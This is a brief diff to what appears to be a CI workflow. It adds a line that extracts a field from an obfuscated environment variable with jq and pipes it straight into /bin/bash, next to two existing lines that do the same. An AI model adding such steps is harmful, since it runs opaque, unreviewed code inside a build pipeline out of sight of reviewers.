@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$mhz2" | jq -r .zfc729 | /bin/bash
           printf '%s' "$a26555" | jq -r .b99 | /bin/bash
+          printf '%s' "$twu22" | jq -r .esln00683 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
